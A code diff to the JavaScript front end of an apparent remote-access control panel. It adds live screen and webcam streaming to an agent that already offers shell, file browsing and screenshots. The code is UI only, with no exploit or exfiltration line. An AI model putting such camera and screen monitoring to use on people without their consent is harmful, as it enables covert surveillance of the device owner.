@@ -7,6 +7,12 @@
 const deviceId = document.getElementById('device-id').value;
 let ws = null;
 let shellOpen = false;
+let screenStreamActive = false;
+let camStreamActive = false;
+let screenFramesCount = 0;
+let camFramesCount = 0;
+let screenFpsInterval = null;
+let camFpsInterval = null;
 
 // ===== WebSocket =====
 function connectWS() {
@@ -27,6 +33,8 @@ function connectWS() {
     ws.onclose = () => {
         console.log('WS disconnected, reconnect in 3s...');
         setStatus(false);
+        stopScreenStreamUI();
+        stopCamStreamUI();
         setTimeout(connectWS, 3000);
     };
 
@@ -44,6 +52,8 @@ function setStatus(online) {
     } else {
         dot.className = 'dot dot-red';
         text.textContent = 'Агент офлайн';
+        stopScreenStreamUI();
+        stopCamStreamUI();
     }
 }
 
@@ -72,7 +82,53 @@ function handleMessage(msg) {
         return;
     }
 
-    // Скриншот
+    // Live экран (Screen Stream)
+    if (t === 'screen_frame') {
+        const img = document.getElementById('screen-stream-img');
+        const placeholder = document.getElementById('screen-stream-placeholder');
+        const badge = document.getElementById('screen-stream-badge');
+        if (p.error) {
+            placeholder.textContent = 'Ошибка экрана: ' + p.error;
+            placeholder.style.display = 'block';
+            img.style.display = 'none';
+            badge.style.display = 'none';
+            stopScreenStreamUI();
+            return;
+        }
+        if (p.image_b64) {
+            img.src = 'data:image/jpeg;base64,' + p.image_b64;
+            img.style.display = 'block';
+            placeholder.style.display = 'none';
+            badge.style.display = 'flex';
+            screenFramesCount++;
+        }
+        return;
+    }
+
+    // Live камера (Camera Stream)
+    if (t === 'stream_frame') {
+        const img = document.getElementById('cam-stream-img');
+        const placeholder = document.getElementById('cam-stream-placeholder');
+        const badge = document.getElementById('cam-stream-badge');
+        if (p.error) {
+            placeholder.textContent = 'Ошибка камеры: ' + p.error;
+            placeholder.style.display = 'block';
+            img.style.display = 'none';
+            badge.style.display = 'none';
+            stopCamStreamUI();
+            return;
+        }
+        if (p.image_b64) {
+            img.src = 'data:image/jpeg;base64,' + p.image_b64;
+            img.style.display = 'block';
+            placeholder.style.display = 'none';
+            badge.style.display = 'flex';
+            camFramesCount++;
+        }
+        return;
+    }
+
+    // Одиночный скриншот
     if (t === 'screenshot_data') {
         const container = document.getElementById('screenshot-container');
         if (p.image_b64) {
@@ -314,14 +370,165 @@ function fsNavigate(path, isDir) {
     }
 }
 
+// ===== Live Screen Streaming =====
+function toggleScreenStream() {
+    if (screenStreamActive) {
+        stopScreenStream();
+    } else {
+        startScreenStream();
+    }
+}
+
+function startScreenStream() {
+    const fps = parseInt(document.getElementById('screen-fps').value) || 5;
+    const quality = parseInt(document.getElementById('screen-quality').value) || 60;
+    sendCmd('screen_start', { fps: fps, quality: quality });
+    screenStreamActive = true;
+
+    const btn = document.getElementById('btn-screen-stream');
+    if (btn) {
+        btn.textContent = '⏹️ Остановить трансляцию';
+        btn.className = 'btn btn-danger';
+    }
+
+    const placeholder = document.getElementById('screen-stream-placeholder');
+    if (placeholder) {
+        placeholder.textContent = 'Подключение к видеопотоку экрана...';
+        placeholder.style.display = 'block';
+    }
+    const badge = document.getElementById('screen-stream-badge');
+    if (badge) badge.style.display = 'flex';
+
+    screenFramesCount = 0;
+    clearInterval(screenFpsInterval);
+    screenFpsInterval = setInterval(() => {
+        const counter = document.getElementById('screen-fps-counter');
+        if (counter) counter.textContent = `(${screenFramesCount} FPS)`;
+        screenFramesCount = 0;
+    }, 1000);
+}
+
+function stopScreenStream() {
+    sendCmd('screen_stop', {});
+    stopScreenStreamUI();
+}
+
+function stopScreenStreamUI() {
+    screenStreamActive = false;
+    clearInterval(screenFpsInterval);
+    const btn = document.getElementById('btn-screen-stream');
+    if (btn) {
+        btn.textContent = '▶️ Запустить трансляцию экрана';
+        btn.className = 'btn btn-primary';
+    }
+    const badge = document.getElementById('screen-stream-badge');
+    if (badge) badge.style.display = 'none';
+}
+
+function onScreenSettingsChange() {
+    if (screenStreamActive) {
+        const fps = parseInt(document.getElementById('screen-fps').value) || 5;
+        const quality = parseInt(document.getElementById('screen-quality').value) || 60;
+        sendCmd('screen_start', { fps: fps, quality: quality });
+    }
+}
+
+// ===== Live Camera Streaming =====
+function toggleCamStream() {
+    if (camStreamActive) {
+        stopCamStream();
+    } else {
+        startCamStream();
+    }
+}
+
+function startCamStream() {
+    const index = parseInt(document.getElementById('cam-index').value) || 0;
+    const fps = parseInt(document.getElementById('cam-fps').value) || 10;
+    sendCmd('stream_start', { index: index, fps: fps, quality: 60 });
+    camStreamActive = true;
+
+    const btn = document.getElementById('btn-cam-stream');
+    if (btn) {
+        btn.textContent = '⏹️ Выключить камеру';
+        btn.className = 'btn btn-danger';
+    }
+
+    const placeholder = document.getElementById('cam-stream-placeholder');
+    if (placeholder) {
+        placeholder.textContent = 'Подключение к веб-камере...';
+        placeholder.style.display = 'block';
+    }
+    const badge = document.getElementById('cam-stream-badge');
+    if (badge) badge.style.display = 'flex';
+
+    camFramesCount = 0;
+    clearInterval(camFpsInterval);
+    camFpsInterval = setInterval(() => {
+        const counter = document.getElementById('cam-fps-counter');
+        if (counter) counter.textContent = `(${camFramesCount} FPS)`;
+        camFramesCount = 0;
+    }, 1000);
+}
+
+function stopCamStream() {
+    sendCmd('stream_stop', {});
+    stopCamStreamUI();
+}
+
+function stopCamStreamUI() {
+    camStreamActive = false;
+    clearInterval(camFpsInterval);
+    const btn = document.getElementById('btn-cam-stream');
+    if (btn) {
+        btn.textContent = '▶️ Включить камеру';
+        btn.className = 'btn btn-primary';
+    }
+    const badge = document.getElementById('cam-stream-badge');
+    if (badge) badge.style.display = 'none';
+}
+
+// ===== Fullscreen Helper =====
+function toggleFullscreen(elemId) {
+    const elem = document.getElementById(elemId);
+    if (!elem) return;
+    if (!document.fullscreenElement) {
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+        } else if (elem.webkitRequestFullscreen) {
+            elem.webkitRequestFullscreen();
+        }
+    } else {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        }
+    }
+}
+
 // ===== Вкладки =====
 document.querySelectorAll('.tab').forEach(tab => {
     tab.addEventListener('click', () => {
+        const targetTab = tab.dataset.tab;
+
+        // При переключении с вкладки экрана останавливаем стрим для экономии ресурсов
+        if (targetTab !== 'tab-screen' && screenStreamActive) {
+            stopScreenStream();
+        }
+        // При переключении с камеры останавливаем камеру
+        if (targetTab !== 'tab-cam' && camStreamActive) {
+            stopCamStream();
+        }
+
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
         tab.classList.add('active');
-        document.getElementById(tab.dataset.tab).classList.add('active');
+        document.getElementById(targetTab).classList.add('active');
     });
+});
+
+window.addEventListener('beforeunload', () => {
+    if (screenStreamActive) sendCmd('screen_stop', {});
+    if (camStreamActive) sendCmd('stream_stop', {});
 });
 
 // ===== Запуск =====
